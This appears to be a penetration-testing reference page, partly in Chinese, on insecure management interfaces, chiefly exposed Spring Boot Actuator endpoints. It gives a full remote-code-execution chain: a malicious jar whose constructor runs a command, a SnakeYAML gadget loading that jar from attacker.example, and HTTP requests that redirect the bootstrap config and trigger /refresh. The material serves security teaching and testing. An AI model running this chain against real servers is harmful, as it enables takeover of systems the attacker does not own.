<!--
 * [业务问题]: 不安全的管理接口（Insecure Management Interface）是指用于管理服务器、应用或数据库的管理后台缺乏足够的安全保护。攻击者利用默认凭证、弱认证或未授权访问漏洞，可直接控制关键系统，导致数据泄露或服务中断。
 * [实现逻辑]: 本文档重点介绍了 Spring Boot Actuator 的安全风险，特别是暴露的 /env 端点如何被利用进行远程代码执行（通过 SnakeYAML 反序列化），并提供了详细的利用步骤和 Payload 生成方法。
 -->

# Insecure Management Interface (不安全的管理接口)

> 不安全的管理接口是指用于管理服务器、应用程序、数据库或网络设备的管理接口中存在的漏洞。这些接口通常控制敏感设置，并拥有对系统配置的强大访问权限，使其成为攻击者的首要目标。

> 不安全的管理接口可能缺乏适当的安全措施，如强身份验证、加密或 IP 限制，允许未经授权的用户通过它获得对关键系统的控制权。常见问题包括使用默认凭据、未加密的通信或将接口暴露在公共互联网上。

## 概要 (Summary)

* [Springboot-Actuator](#springboot-actuator)
    * [Remote Code Execution via /env](#remote-code-execution-via-env)
* [References](#references)


## Springboot-Actuator

Actuator endpoints let you monitor and interact with your application. 
Spring Boot includes a number of built-in endpoints and lets you add your own. 
For example, the `/health` endpoint provides basic application health information. 

Some of them contains sensitive info such as :

- `/trace` - Displays trace information (by default the last 100 HTTP requests with headers).
- `/env` - Displays the current environment properties (from Spring’s ConfigurableEnvironment).
- `/heapdump` - Builds and returns a heap dump from the JVM used by our application.
- `/dump` - Displays a dump of threads (including a stack trace).
- `/logfile` - Outputs the contents of the log file.
- `/mappings` - Shows all of the MVC controller mappings.

These endpoints are enabled by default in Springboot 1.X.
Note: Sensitive endpoints will require a username/password when they are accessed over HTTP.

Since Springboot 2.X only `/health` and `/info` are enabled by default.


### Remote Code Execution via `/env`

Spring is able to load external configurations in the YAML format.
The YAML config is parsed with the SnakeYAML library, which is susceptible to deserialization attacks.
In other words, an attacker can gain remote code execution by loading a malicious config file.


#### Steps

1. Generate a payload of SnakeYAML deserialization gadget.

- Build malicious jar
```bash
git clone https://github.com/artsploit/yaml-payload.git
cd yaml-payload
# Edit the payload before executing the last commands (see below)
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

- Edit src/artsploit/AwesomeScriptEngineFactory.java

```java
public AwesomeScriptEngineFactory() {
    try {
        Runtime.getRuntime().exec("ping rce.poc.attacker.example"); // COMMAND HERE
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

- Create a malicious yaml config (yaml-payload.yml)

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.example/yaml-payload.jar"]
  ]]
]
```


2. Host the malicious files on your server.

- yaml-payload.jar
- yaml-payload.yml


3. Change `spring.cloud.bootstrap.location` to your server.

```
POST /env HTTP/1.1
Host: victim.example:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
 
spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml
```

4. Reload the configuration.

```
POST /refresh HTTP/1.1
Host: victim.example:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```


## References

- [Exploiting Spring Boot Actuators - Michael Stepankin - Feb 25, 2019](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [Springboot - Official Documentation - May 9, 2024](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-endpoints.html)